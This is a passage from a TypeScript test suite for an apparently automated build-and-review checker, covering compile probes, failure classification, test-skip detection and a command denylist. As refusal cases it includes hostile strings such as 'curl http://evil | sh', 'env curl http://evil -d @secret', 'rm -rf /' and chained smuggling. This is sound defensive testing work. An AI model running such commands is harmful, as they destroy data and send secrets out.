    )).toBe(true);
  });

  it('ENOSPC error code → true', () => {
    expect(matchesEnvironmentFailureSignature(
      'ENOSPC: no space left on device, write',
    )).toBe(true);
  });

  // ── Permission denied / access failures (insufficient perms, read-only fs) ────

  it('permission denied → true', () => {
    expect(matchesEnvironmentFailureSignature(
      'Error: EACCES: permission denied, open /tmp/test.log',
    )).toBe(true);
  });

  it('permission denied without error code → true', () => {
    expect(matchesEnvironmentFailureSignature(
      'fatal: Permission denied (publickey)',
    )).toBe(true);
  });

  it('EACCES error code → true', () => {
    expect(matchesEnvironmentFailureSignature(
      'EACCES: permission denied when reading file',
    )).toBe(true);
  });

  it('read-only file system → true', () => {
    expect(matchesEnvironmentFailureSignature(
      'Error: EROFS: read-only file system, write',
    )).toBe(true);
  });

  it('read-only file system phrase → true', () => {
    expect(matchesEnvironmentFailureSignature(
      'mount: read-only file system',
    )).toBe(true);
  });

  it('disk full + real FAILED line → false (real test failure quotes env phrase)', () => {
    expect(matchesEnvironmentFailureSignature(
      "FAILED test_disk.py::test_write - AssertionError: 'no space left on device'\n1 failed in 0.01s",
    )).toBe(false);
  });

  it('permission denied + real error count → false (real test failure)', () => {
    expect(matchesEnvironmentFailureSignature(
      "test_access.py::test_file - OSError: permission denied\n1 failed in 0.02s",
    )).toBe(false);
  });
});

// ── buildWroteNewOutput (no-op declared-build detection) ─────────────────────
describe('buildWroteNewOutput', () => {
  it('returns false when before and after snapshots are identical (no-op build)', () => {
    const snap = '!! node_modules/\n!! .vitest_cache/\n';
    expect(buildWroteNewOutput(snap, snap)).toBe(false);
  });

  it('returns false for two empty snapshots (clean tree, nothing written)', () => {
    expect(buildWroteNewOutput('', '')).toBe(false);
  });

  it('returns true when after introduces a new untracked artifact', () => {
    const before = '!! node_modules/\n';
    const after = '!! node_modules/\n?? dist/bundle.js\n';
    expect(buildWroteNewOutput(before, after)).toBe(true);
  });

  it('returns true when after modifies a tracked file', () => {
    expect(buildWroteNewOutput('', ' M src/generated.ts\n')).toBe(true);
  });

  it('ignores pre-existing warm-VM cache dirs present in both snapshots', () => {
    // node_modules / .pnpm-store survive `git clean -fdx` and show up in BOTH
    // snapshots — a diff must not count them as fresh build output.
    const before = '!! node_modules/\n!! .pnpm-store/\n!! .testmondata\n';
    const after = '!! .pnpm-store/\n!! node_modules/\n!! .testmondata\n';
    expect(buildWroteNewOutput(before, after)).toBe(false);
  });

  it('tolerates CRLF line endings and blank lines', () => {
    expect(buildWroteNewOutput('!! a\r\n\r\n', '!! a\r\n')).toBe(false);
    expect(buildWroteNewOutput('!! a\r\n', '!! a\r\n?? b\r\n')).toBe(true);
  });
});

// ── detectAcceptanceProbes ───────────────────────────────────────────────────
describe('detectAcceptanceProbes', () => {
  beforeEach(() => {
    mockFs.existsSync.mockReset();
    mockFs.readFileSync.mockReset();
    mockFs.readdirSync.mockReset();
    mockFs.existsSync.mockReturnValue(false);
    mockFs.readFileSync.mockReturnValue('');
    mockFs.readdirSync.mockReturnValue([]);
  });

  it('build_config python directory → compileall probe (type hint, no manifest needed)', () => {
    const probes = detectAcceptanceProbes({
      directories: [{ path: 'backend', type: 'python', test_cmd: 'pytest' }],
    });
    const py = probes.find(p => p.ecosystem === 'python');
    expect(py).toBeDefined();
    expect(py?.cmd).toBe('python3');
    expect(py?.args.slice(0, 3)).toEqual(['-m', 'compileall', '-q']);
    expect(py?.args.at(-1)).toBe(`${WORKSPACE}/backend`);
    expect(py?.cwd).toBe(`${WORKSPACE}/backend`);
  });

  it('tsconfig.json present → tsc --noEmit probe (no-install)', () => {
    mockFs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/tsconfig.json`);
    const probes = detectAcceptanceProbes(undefined);
    const node = probes.find(p => p.ecosystem === 'node');
    expect(node).toBeDefined();
    expect(node?.cmd).toBe('npx');
    expect(node?.args).toEqual(['--no-install', 'tsc', '--noEmit']);
  });

  it('go.mod present → go build ./... probe', () => {
    mockFs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/go.mod`);
    const probes = detectAcceptanceProbes(undefined);
    const go = probes.find(p => p.ecosystem === 'go');
    expect(go).toEqual(expect.objectContaining({ cmd: 'go', args: ['build', './...'], cwd: WORKSPACE }));
  });

  it('Cargo.toml present → cargo check probe', () => {
    mockFs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/Cargo.toml`);
    const probes = detectAcceptanceProbes(undefined);
    const rust = probes.find(p => p.ecosystem === 'rust');
    expect(rust).toEqual(expect.objectContaining({ cmd: 'cargo', args: ['check', '--quiet'], cwd: WORKSPACE }));
  });

  it('*.csproj present → dotnet build probe (glob-detected)', () => {
    mockFs.readdirSync.mockImplementation((p: string) =>
      p === WORKSPACE ? ['App.csproj', 'Program.cs'] : [],
    );
    const probes = detectAcceptanceProbes(undefined);
    const dotnet = probes.find(p => p.ecosystem === 'dotnet');
    expect(dotnet).toEqual(expect.objectContaining({ cmd: 'dotnet', args: ['build', '--nologo'], cwd: WORKSPACE }));
  });

  it('*.sln present → dotnet build probe (glob-detected)', () => {
    mockFs.readdirSync.mockImplementation((p: string) => (p === WORKSPACE ? ['Solution.sln'] : []));
    const probes = detectAcceptanceProbes(undefined);
    expect(probes.find(p => p.ecosystem === 'dotnet')?.cmd).toBe('dotnet');
  });

  it('build.gradle present → gradlew classes probe (compile-only)', () => {
    mockFs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/build.gradle`);
    const probes = detectAcceptanceProbes(undefined);
    const gradle = probes.find(p => p.ecosystem === 'gradle');
    expect(gradle).toEqual(expect.objectContaining({ cmd: './gradlew', args: ['classes', '--no-daemon'], cwd: WORKSPACE }));
  });

  it('build.gradle.kts present → gradlew classes probe (Kotlin DSL)', () => {
    mockFs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/build.gradle.kts`);
    const probes = detectAcceptanceProbes(undefined);
    expect(probes.find(p => p.ecosystem === 'gradle')?.cmd).toBe('./gradlew');
  });

  it('pom.xml present → mvn offline test-compile probe', () => {
    mockFs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/pom.xml`);
    const probes = detectAcceptanceProbes(undefined);
    const maven = probes.find(p => p.ecosystem === 'maven');
    expect(maven).toEqual(expect.objectContaining({ cmd: 'mvn', args: ['-o', '-B', 'test-compile'], cwd: WORKSPACE }));
  });

  it('mix.exs present → mix compile probe', () => {
    mockFs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/mix.exs`);
    const probes = detectAcceptanceProbes(undefined);
    const elixir = probes.find(p => p.ecosystem === 'elixir');
    expect(elixir).toEqual(expect.objectContaining({ cmd: 'mix', args: ['compile'], cwd: WORKSPACE }));
  });

  it('plain-JS package (package.json, no tsconfig) → no node probe (nothing cheap+safe to compile)', () => {
    mockFs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/package.json`);
    const probes = detectAcceptanceProbes(undefined);
    expect(probes.find(p => p.ecosystem === 'node')).toBeUndefined();
  });

  it('bare repo with no recognized manifests → no probes', () => {
    expect(detectAcceptanceProbes(undefined)).toEqual([]);
  });

  it('deduplicates by ecosystem:cwd across build_config + auto-scan', () => {
    // build_config declares root python; auto-detect would also see pyproject at root.
    mockFs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/pyproject.toml`);
    const probes = detectAcceptanceProbes({
      directories: [{ path: '', type: 'python', test_cmd: 'pytest' }],
    });
    expect(probes.filter(p => p.ecosystem === 'python' && p.cwd === WORKSPACE)).toHaveLength(1);
  });

  // ── declared build_cmd probes ──────────────────────────────────────────────
  it('build_config dir with build_cmd → declared probe (plain command tokenized)', () => {
    const probes = detectAcceptanceProbes({
      directories: [{ path: 'admin-ui', type: 'node', build_cmd: 'npm run build' }],
    });
    const declared = probes.find(p => p.declared);
    expect(declared).toBeDefined();
    expect(declared?.cmd).toBe('npm');
    expect(declared?.args).toEqual(['run', 'build']);
    expect(declared?.cwd).toBe(`${WORKSPACE}/admin-ui`);
    expect(declared?.ecosystem).toBe('node');
    expect(declared?.label).toBe('npm run build (admin-ui)');
  });

  it('build_cmd with shell operators → bash -c wrapped declared probe', () => {
    const probes = detectAcceptanceProbes({
      directories: [{ path: '', type: 'rust', build_cmd: 'make && cargo build --features x' }],
    });
    const declared = probes.find(p => p.declared);
    expect(declared).toBeDefined();
    expect(declared?.cmd).toBe('bash');
    expect(declared?.args).toEqual(['-c', 'make && cargo build --features x']);
    expect(declared?.cwd).toBe(WORKSPACE);
    expect(declared?.label).toBe('make && cargo build --features x (root)');
  });

  it('build_cmd on a dir type without a language bucket → ecosystem "build"', () => {
    const probes = detectAcceptanceProbes({
      directories: [{ path: 'svc', type: 'other', build_cmd: 'make release' }],
    });
    const declared = probes.find(p => p.declared);
    expect(declared?.ecosystem).toBe('build');
  });

  it('declared build_cmd is preferred over the generic probe for the same dir', () => {
    // Same dir declares both a build_cmd AND a python type hint: only the
    // declared probe is emitted — no competing generic compileall probe.
    const probes = detectAcceptanceProbes({
      directories: [{ path: 'backend', type: 'python', build_cmd: 'make build', test_cmd: 'pytest' }],
    });
    const forBackend = probes.filter(p => p.cwd === `${WORKSPACE}/backend`);
    expect(forBackend).toHaveLength(1);
    expect(forBackend[0].declared).toBe(true);
    expect(forBackend[0].cmd).toBe('make');
    expect(probes.some(p => p.cmd === 'python3' && p.cwd === `${WORKSPACE}/backend`)).toBe(false);
  });

  it('declared build_cmd suppresses the depth-1 auto-scan generic probe for that cwd', () => {
    // Auto-scan would otherwise also see pyproject.toml at the declared dir.
    mockFs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/pyproject.toml`);
    const probes = detectAcceptanceProbes({
      directories: [{ path: '', type: 'python', build_cmd: 'make build' }],
    });
    const atRoot = probes.filter(p => p.cwd === WORKSPACE);
    expect(atRoot).toHaveLength(1);
    expect(atRoot[0].declared).toBe(true);
  });

  it('a dir with only test_cmd (no build_cmd) still emits the generic probe', () => {
    const probes = detectAcceptanceProbes({
      directories: [{ path: 'backend', type: 'python', test_cmd: 'pytest' }],
    });
    expect(probes.some(p => p.declared)).toBe(false);
    expect(probes.find(p => p.ecosystem === 'python')?.cmd).toBe('python3');
  });

  it('empty/whitespace build_cmd is ignored (no declared probe)', () => {
    const probes = detectAcceptanceProbes({
      directories: [{ path: 'backend', type: 'python', build_cmd: '   ', test_cmd: 'pytest' }],
    });
    expect(probes.some(p => p.declared)).toBe(false);
  });
});

// ── classifyProbeOutcome ─────────────────────────────────────────────────────
describe('classifyProbeOutcome', () => {
  it('null error (exit 0) → pass', () => {
    expect(classifyProbeOutcome('', null)).toBe('pass');
  });

  it('clean python SyntaxError → fail', () => {
    const err = Object.assign(new Error('failed'), { status: 1 });
    expect(classifyProbeOutcome('  File "x.py", line 2\nSyntaxError: invalid syntax', err)).toBe('fail');
  });

  it('tsc type error (error TS2322) → fail', () => {
    const err = Object.assign(new Error('failed'), { status: 2 });
    expect(classifyProbeOutcome("src/a.ts(3,5): error TS2322: Type 'number' is not assignable to type 'string'.", err)).toBe('fail');
  });

  it('rustc error[E0425] → fail', () => {
    const err = Object.assign(new Error('failed'), { status: 101 });
    expect(classifyProbeOutcome('error[E0425]: cannot find value `x` in this scope', err)).toBe('fail');
  });

  it('go build "undefined: Foo" → fail', () => {
    const err = Object.assign(new Error('failed'), { status: 1 });
    expect(classifyProbeOutcome('./main.go:5:2: undefined: Foo', err)).toBe('fail');
  });

  it('C# compile error (error CS0103) → fail', () => {
    const err = Object.assign(new Error('failed'), { status: 1 });
    expect(classifyProbeOutcome("Program.cs(5,9): error CS0103: The name 'foo' does not exist in the current context", err)).toBe('fail');
  });

  it('.NET missing toolchain (dotnet not installed) → could_not_run, not a hard block', () => {
    const err = Object.assign(new Error('failed'), { status: 127 });
    expect(classifyProbeOutcome('dotnet: command not found', err)).toBe('could_not_run');
  });

  it('Maven compile error (COMPILATION ERROR) → fail', () => {
    const err = Object.assign(new Error('failed'), { status: 1 });
    expect(classifyProbeOutcome('[ERROR] COMPILATION ERROR :\n[ERROR] /src/Foo.java:[5,1] cannot find symbol', err)).toBe('fail');
  });

  it('Gradle compile error (Compilation failed) → fail', () => {
    const err = Object.assign(new Error('failed'), { status: 1 });
    expect(classifyProbeOutcome("> Task :compileJava FAILED\nCompilation failed; see the compiler error output for details.", err)).toBe('fail');
  });

  it('Elixir compile error (** (CompileError)) → fail', () => {
    const err = Object.assign(new Error('failed'), { status: 1 });
    expect(classifyProbeOutcome('** (CompileError) lib/foo.ex:5: undefined function bar/0', err)).toBe('fail');
  });

  it('Maven offline missing deps → conservative could_not_run (fall open, not a hard block)', () => {
    const err = Object.assign(new Error('failed'), { status: 1 });
    expect(classifyProbeOutcome('[ERROR] Cannot access central in offline mode and the artifact has not been downloaded', err)).toBe('could_not_run');
  });

  it('Gradle missing toolchain (gradlew absent) → could_not_run', () => {
    const err = Object.assign(new Error('spawn ./gradlew ENOENT'), { code: 'ENOENT' });
    expect(classifyProbeOutcome('', err)).toBe('could_not_run');
  });

  it('spawn ENOENT (missing tool) → could_not_run', () => {
    const err = Object.assign(new Error('spawn python3 ENOENT'), { code: 'ENOENT' });
    expect(classifyProbeOutcome('', err)).toBe('could_not_run');
  });

  it('ETIMEDOUT → could_not_run', () => {
    const err = Object.assign(new Error('timed out'), { code: 'ETIMEDOUT' });
    expect(classifyProbeOutcome('', err)).toBe('could_not_run');
  });

  it('python ModuleNotFoundError (missing dep) → could_not_run', () => {
    const err = Object.assign(new Error('failed'), { status: 1 });
    expect(classifyProbeOutcome("ModuleNotFoundError: No module named 'numpy'", err)).toBe('could_not_run');
  });

  it('tsc "Cannot find module" (TS2307, missing deps) → could_not_run, not a hard block', () => {
    const err = Object.assign(new Error('failed'), { status: 2 });
    expect(classifyProbeOutcome("src/a.ts(1,20): error TS2307: Cannot find module 'react'.", err)).toBe('could_not_run');
  });

  it('go missing module → could_not_run', () => {
    const err = Object.assign(new Error('failed'), { status: 1 });
    expect(classifyProbeOutcome('main.go:3:8: no required module provides package example.com/x', err)).toBe('could_not_run');
  });

  it('unrecognized non-zero exit → conservative could_not_run', () => {
    const err = Object.assign(new Error('failed'), { status: 1 });
    expect(classifyProbeOutcome('some unexpected error blob', err)).toBe('could_not_run');
  });

  // ── declared-aware classification ──────────────────────────────────────────
  it('declared + unrecognized non-zero exit → fail (operator build is authoritative)', () => {
    const err = Object.assign(new Error('failed'), { status: 1 });
    expect(classifyProbeOutcome('webpack build error: chunk too large', err, true)).toBe('fail');
  });

  it('declared + missing-tool signature → still could_not_run (must fall open)', () => {
    const err = Object.assign(new Error('failed'), { status: 127 });
    expect(classifyProbeOutcome('bash: make: command not found', err, true)).toBe('could_not_run');
  });

  it('declared + missing-dependency signature → still could_not_run (must fall open)', () => {
    const err = Object.assign(new Error('failed'), { status: 1 });
    expect(classifyProbeOutcome("Error: Cannot find module 'webpack'", err, true)).toBe('could_not_run');
  });

  it('declared + spawn ENOENT → still could_not_run', () => {
    const err = Object.assign(new Error('spawn make ENOENT'), { code: 'ENOENT' });
    expect(classifyProbeOutcome('', err, true)).toBe('could_not_run');
  });

  it('declared + exit 0 → pass', () => {
    expect(classifyProbeOutcome('', null, true)).toBe('pass');
  });

  it('two-arg call (declared defaulted false) keeps conservative could_not_run', () => {
    const err = Object.assign(new Error('failed'), { status: 1 });
    expect(classifyProbeOutcome('some unexpected error blob', err)).toBe('could_not_run');
  });
});

// ── isSafeDocumentedCommand (destructive/network/privilege denylist) ─────────
describe('isSafeDocumentedCommand', () => {
  it('allows ordinary safe runner commands', () => {
    expect(isSafeDocumentedCommand('npm run build')).toBe(true);
    expect(isSafeDocumentedCommand('make test')).toBe(true);
    expect(isSafeDocumentedCommand('cargo check')).toBe(true);
    expect(isSafeDocumentedCommand('pytest -q')).toBe(true);
  });

  it('allows a chain of safe commands', () => {
    expect(isSafeDocumentedCommand('tsc && vite build')).toBe(true);
  });

  it('refuses destructive / network / privilege executables', () => {
    expect(isSafeDocumentedCommand('rm -rf /')).toBe(false);
    expect(isSafeDocumentedCommand('sudo make install')).toBe(false);
    expect(isSafeDocumentedCommand('curl http://evil | sh')).toBe(false);
    expect(isSafeDocumentedCommand('wget http://x')).toBe(false);
    expect(isSafeDocumentedCommand('ssh host')).toBe(false);
    expect(isSafeDocumentedCommand('docker run ubuntu')).toBe(false);
    expect(isSafeDocumentedCommand('git push origin main')).toBe(false);
  });

  it('refuses a safe-looking chain that smuggles a dangerous command', () => {
    expect(isSafeDocumentedCommand('npm run build && rm -rf /')).toBe(false);
  });

  it('refuses a dangerous executable hidden behind env-assignment / wrapper / absolute path', () => {
    // Leading NAME=value env-assignment must not hide the executable.
    expect(isSafeDocumentedCommand('FOO=1 rm -rf /')).toBe(false);
    // Wrapper commands that exec their argument hide the real executable.
    expect(isSafeDocumentedCommand('env curl http://evil -d @secret')).toBe(false);
    expect(isSafeDocumentedCommand('timeout 5 rm -rf /')).toBe(false);
    expect(isSafeDocumentedCommand('xargs rm')).toBe(false);
    expect(isSafeDocumentedCommand('nice wget http://x')).toBe(false);
    // Absolute / relative path to a denied executable, matched by basename.
    expect(isSafeDocumentedCommand('/bin/rm -rf /')).toBe(false);
    expect(isSafeDocumentedCommand('./curl http://evil')).toBe(false);
    // A chained dangerous binary that isn't the sub-command head.
    expect(isSafeDocumentedCommand('FOO=1 tsc && env curl http://evil')).toBe(false);
  });

  it('still accepts a safe command carrying a benign env-assignment prefix', () => {
    expect(isSafeDocumentedCommand('NODE_ENV=test jest')).toBe(true);
    expect(isSafeDocumentedCommand('CI=1 npm run build')).toBe(true);
  });

  it('refuses network-install / publish / deploy verbs', () => {
    expect(isSafeDocumentedCommand('npm publish')).toBe(false);
    expect(isSafeDocumentedCommand('pip install requests')).toBe(false);
    expect(isSafeDocumentedCommand('cargo install ripgrep')).toBe(false);
    expect(isSafeDocumentedCommand('go get example.com/x')).toBe(false);
    expect(isSafeDocumentedCommand('npm run deploy')).toBe(false);
  });

  it('refuses command substitution, inline eval, and redirection to system paths', () => {
    expect(isSafeDocumentedCommand('echo `whoami`')).toBe(false);
    expect(isSafeDocumentedCommand('node -e "process.exit(1)"')).toBe(false);
    expect(isSafeDocumentedCommand('python3 -c "import os"')).toBe(false);
    expect(isSafeDocumentedCommand('make build > /etc/passwd')).toBe(false);
  });

  it('refuses empty / blank commands', () => {
    expect(isSafeDocumentedCommand('')).toBe(false);
    expect(isSafeDocumentedCommand('   ')).toBe(false);
  });
});

// ── isAllowlistedRunnerShape (free-text README first-token allowlist) ─────────
describe('isAllowlistedRunnerShape', () => {
  it('accepts known-safe runner first tokens', () => {
    expect(isAllowlistedRunnerShape('npm test')).toBe(true);
    expect(isAllowlistedRunnerShape('make build')).toBe(true);
    expect(isAllowlistedRunnerShape('pytest')).toBe(true);
  });

  it('rejects unknown / dangerous first tokens', () => {
    expect(isAllowlistedRunnerShape('rm -rf /')).toBe(false);
    expect(isAllowlistedRunnerShape('./deploy.sh')).toBe(false);
    expect(isAllowlistedRunnerShape('')).toBe(false);
  });
});

// ── discoverDocumentedCommands (diff-aware structured + prose discovery) ──────
describe('discoverDocumentedCommands', () => {
  const WS = '/tmp/workspace';
  // Build a readFile stub from a relPath→text map.
  const reader = (files: Record<string, string>) =>
    (rel: string): string | null => (rel in files ? files[rel] : null);

  it('discovers a newly added package.json build script', () => {
    const pkg = JSON.stringify({ scripts: { build: 'tsc -p .' } });
    const cmds = discoverDocumentedCommands({
      changedFiles: ['agent/package.json'],
      addedLines: ['"build": "tsc -p ."'],
      readFile: reader({ 'agent/package.json': pkg }),
      workspace: WS,
    });
    expect(cmds).toHaveLength(1);
    expect(cmds[0].command).toBe('npm run build');
    expect(cmds[0].cwd).toBe(`${WS}/agent`);
    expect(cmds[0].heavy).toBe(true);
    expect(cmds[0].source).toBe('package.json scripts.build');
  });

  it('ignores a package.json script that was NOT added in the diff', () => {
    const pkg = JSON.stringify({ scripts: { build: 'tsc -p .' } });
    const cmds = discoverDocumentedCommands({
      changedFiles: ['package.json'],
      addedLines: ['"version": "1.0.1"'], // unrelated added line
      readFile: reader({ 'package.json': pkg }),
      workspace: WS,
    });
    expect(cmds).toHaveLength(0);
  });

  it('refuses a newly added script whose BODY is destructive', () => {
    const pkg = JSON.stringify({ scripts: { test: 'rm -rf / && jest' } });
    const cmds = discoverDocumentedCommands({
      changedFiles: ['package.json'],
      addedLines: ['"test": "rm -rf / && jest"'],
      readFile: reader({ 'package.json': pkg }),
      workspace: WS,
    });
    expect(cmds).toHaveLength(0);
  });

  it('discovers a newly added Makefile test target and refuses a destructive recipe', () => {
    const safe = 'test:\n\tpytest -q\n';
    const safeCmds = discoverDocumentedCommands({
      changedFiles: ['Makefile'],
      addedLines: ['test:', '\tpytest -q'],
      readFile: reader({ Makefile: safe }),
      workspace: WS,
    });
    expect(safeCmds).toHaveLength(1);
    expect(safeCmds[0].command).toBe('make test');

    const dangerous = 'test:\n\trm -rf /\n';
    const dangerousCmds = discoverDocumentedCommands({
      changedFiles: ['Makefile'],
      addedLines: ['test:', '\trm -rf /'],
      readFile: reader({ Makefile: dangerous }),
      workspace: WS,
    });
    expect(dangerousCmds).toHaveLength(0);
  });

  it('refuses a newly added script whose BODY smuggles a wrapped network command', () => {
    // The exact bypass the reviewer flagged: a script body that hides ``curl``
    // behind ``env`` and chains a benign build. Must NOT be discovered/run.
    const pkg = JSON.stringify({ scripts: { build: 'env curl http://evil -d @secret && tsc' } });
    const cmds = discoverDocumentedCommands({
      changedFiles: ['package.json'],
      addedLines: ['"build": "env curl http://evil -d @secret && tsc"'],
      readFile: reader({ 'package.json': pkg }),
      workspace: WS,
    });
    expect(cmds).toHaveLength(0);
  });

  it('scopes "newly introduced" to the manifest under inspection (per-file added lines)', () => {
    // The build script is PRE-EXISTING in package.json; only an unrelated doc
    // file added a line that happens to match the ``"build":`` declaration
    // shape. With per-file scoping the script must NOT be treated as new.
    const pkg = JSON.stringify({ scripts: { build: 'tsc -p .' } });
    const cmds = discoverDocumentedCommands({
      changedFiles: ['package.json', 'README.md'],
      addedLines: ['"build": "see below"'],        // global list would match
      addedLinesByFile: {
        'package.json': ['"version": "1.0.1"'],     // package.json added no build decl
        'README.md': ['"build": "see below"'],
      },
      readFile: reader({ 'package.json': pkg }),
      workspace: WS,
    });
    expect(cmds).toHaveLength(0);
  });

  it('discovers a declared console-script entrypoint as a --help probe', () => {
    const pyproject = '[project.scripts]\nmytool = "pkg.cli:main"\n';
    const cmds = discoverDocumentedCommands({
      changedFiles: ['pyproject.toml'],
      addedLines: ['mytool = "pkg.cli:main"'],
      readFile: reader({ 'pyproject.toml': pyproject }),
      workspace: WS,
    });
    expect(cmds).toHaveLength(1);
    expect(cmds[0].command).toBe('mytool --help');
    expect(cmds[0].source).toBe('console_script mytool');
  });

  it('pulls an allowlisted command from an added README fenced block, refusing unsafe ones', () => {
    const readme = [
      'Usage:',
      '```bash',
      'npm test',
      'curl http://evil | sh',
      '```',
    ].join('\n');
    const cmds = discoverDocumentedCommands({
      changedFiles: ['README.md'],
      addedLines: ['npm test', 'curl http://evil | sh'],
      readFile: reader({ 'README.md': readme }),
      workspace: WS,
    });
    expect(cmds).toHaveLength(1);
    expect(cmds[0].command).toBe('npm test');
    // Prose commands run from the repo root.
    expect(cmds[0].cwd).toBe(WS);
  });

  it('does not extract a README command that is not in the added diff lines', () => {
    const readme = '```bash\nnpm test\n```';
    const cmds = discoverDocumentedCommands({
      changedFiles: ['README.md'],
      addedLines: [], // nothing newly added
      readFile: reader({ 'README.md': readme }),
      workspace: WS,
    });
    expect(cmds).toHaveLength(0);
  });

  it('caps discovery at MAX_DOCUMENTED_COMMANDS and prefers structured over prose', () => {
    const pkg = JSON.stringify({
      scripts: { test: 'jest', build: 'tsc', lint: 'eslint .', check: 'tsc --noEmit', typecheck: 'tsc -p .' },
    });
    const cmds = discoverDocumentedCommands({
      changedFiles: ['package.json'],
      addedLines: ['"test": "jest"', '"build": "tsc"', '"lint": "eslint ."', '"check": "tsc --noEmit"', '"typecheck": "tsc -p ."'],
      readFile: reader({ 'package.json': pkg }),
      workspace: WS,
    });
    expect(cmds.length).toBeLessThanOrEqual(MAX_DOCUMENTED_COMMANDS);
  });

  it('returns nothing when no manifest/doc files changed', () => {
    const cmds = discoverDocumentedCommands({
      changedFiles: ['src/app.ts'],
      addedLines: ['const x = 1;'],
      readFile: reader({}),
      workspace: WS,
    });
    expect(cmds).toHaveLength(0);
  });
});

// ── isTestFilePath (test-file path heuristics) ───────────────────────────────
describe('isTestFilePath', () => {
  it('recognizes the common per-ecosystem test-file conventions', () => {
    expect(isTestFilePath('src/foo.test.ts')).toBe(true);
    expect(isTestFilePath('src/foo.spec.tsx')).toBe(true);
    expect(isTestFilePath('pkg/server_test.go')).toBe(true);
    expect(isTestFilePath('backend/test_thing.py')).toBe(true);
    expect(isTestFilePath('backend/thing_test.py')).toBe(true);
    expect(isTestFilePath('spec/models/user_spec.rb')).toBe(true);
    expect(isTestFilePath('app/tests/helpers.py')).toBe(true);
    expect(isTestFilePath('app/__tests__/util.js')).toBe(true);
  });

  it('rejects non-test source/prose paths', () => {
    expect(isTestFilePath('src/app.ts')).toBe(false);
    expect(isTestFilePath('README.md')).toBe(false);
    expect(isTestFilePath('backend/app/models.py')).toBe(false);
    expect(isTestFilePath('docs/testing.md')).toBe(false); // mentions "test" in prose, not a test file
    expect(isTestFilePath('')).toBe(false);
  });
});

// ── discoverNewlyDisabledTests (diff-aware newly-introduced skip markers) ─────
describe('discoverNewlyDisabledTests', () => {
  it('detects a newly added JS/TS it.skip in a test file', () => {
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['src/foo.test.ts'],
      addedLinesByFile: { 'src/foo.test.ts': ['it.skip("flaky", () => {', '  expect(1).toBe(1);'] },
    });
    expect(markers).toHaveLength(1);
    expect(markers[0].file).toBe('src/foo.test.ts');
    expect(markers[0].marker).toBe('it.skip');
    expect(markers[0].line).toBe('it.skip("flaky", () => {');
  });

  it('detects xit / xdescribe / describe.skip / test.skip variants', () => {
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['a.test.js', 'b.spec.ts'],
      addedLinesByFile: {
        'a.test.js': ['xit("x", () => {})', 'xdescribe("grp", () => {})'],
        'b.spec.ts': ['describe.skip("d", () => {})', 'test.skip("t", () => {})'],
      },
    });
    expect(markers.map(m => m.marker).sort()).toEqual(
      ['describe.skip', 'test.skip', 'xdescribe', 'xit'],
    );
  });

  it('detects Python pytest markers and unittest decorators, keeping skip vs skipif distinct', () => {
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['test_mod.py'],
      addedLinesByFile: {
        'test_mod.py': [
          '@pytest.mark.skip(reason="broken")',
          '@pytest.mark.skipif(sys.platform == "win32", reason="x")',
          '@pytest.mark.xfail',
          '@unittest.skip("later")',
        ],
      },
    });
    expect(markers.map(m => m.marker)).toEqual([
      '@pytest.mark.skip',
      '@pytest.mark.skipif',
      '@pytest.mark.xfail',
      '@unittest.skip',
    ]);
  });

  it('detects Go t.Skip(, Rust #[ignore], and JUnit @Disabled/@Ignore', () => {
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['svc_test.go', 'lib/tests/mod.rs', 'src/test/java/AppTest.java'],
      addedLinesByFile: {
        'svc_test.go': ['\tt.Skip("not yet")'],
        'lib/tests/mod.rs': ['#[ignore]'],
        'src/test/java/AppTest.java': ['@Disabled', '@Ignore'],
      },
    });
    expect(markers.map(m => m.marker).sort()).toEqual(
      ['#[ignore]', '@Disabled', '@Ignore', 't.Skip()'],
    );
  });

  it('only counts the PR\'s OWN added lines — a pre-existing skip (no added entry) is ignored', () => {
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['src/foo.test.ts'],
      // The file changed but the skip line is pre-existing (not in added lines).
      addedLinesByFile: { 'src/foo.test.ts': ['const x = 2;'] },
    });
    expect(markers).toHaveLength(0);
  });

  it('ignores skip markers added to NON-test files (path heuristic guards prose/source)', () => {
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['src/app.ts', 'README.md'],
      addedLinesByFile: {
        'src/app.ts': ['const describe = { skip: true };'], // not a test file
        'README.md': ['Use it.skip to skip a test'],        // prose, not a test file
      },
    });
    expect(markers).toHaveLength(0);
  });

  it('does not false-positive on commented-out marker mentions in a test file', () => {
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['foo.test.ts', 'test_x.py'],
      addedLinesByFile: {
        'foo.test.ts': ['// it.skip is deprecated, do not use', '* describe.skip example'],
        'test_x.py': ['# @pytest.mark.skip is discouraged here'],
      },
    });
    expect(markers).toHaveLength(0);
  });

  it('still detects a Rust #[ignore] attribute (not treated as a comment despite leading #)', () => {
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['lib/tests/mod.rs'],
      addedLinesByFile: { 'lib/tests/mod.rs': ['#[ignore = "slow"]'] },
    });
    expect(markers).toHaveLength(1);
    expect(markers[0].marker).toBe('#[ignore]');
  });

  it('caps reported markers at MAX_DISABLED_TEST_MARKERS', () => {
    const many = Array.from({ length: MAX_DISABLED_TEST_MARKERS + 5 }, (_, i) => `it.skip("t${i}", () => {})`);
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['big.test.ts'],
      addedLinesByFile: { 'big.test.ts': many },
    });
    expect(markers).toHaveLength(MAX_DISABLED_TEST_MARKERS);
  });

  it('returns nothing when no test files changed', () => {
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['src/app.ts'],
      addedLinesByFile: { 'src/app.ts': ['it.skip("x")'] },
    });
    expect(markers).toHaveLength(0);
  });

  it('detects RSpec pending as a skip marker but not as a string/symbol/identifier', () => {
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['spec/app_spec.rb'],
      addedLinesByFile: {
        'spec/app_spec.rb': [
          'pending',
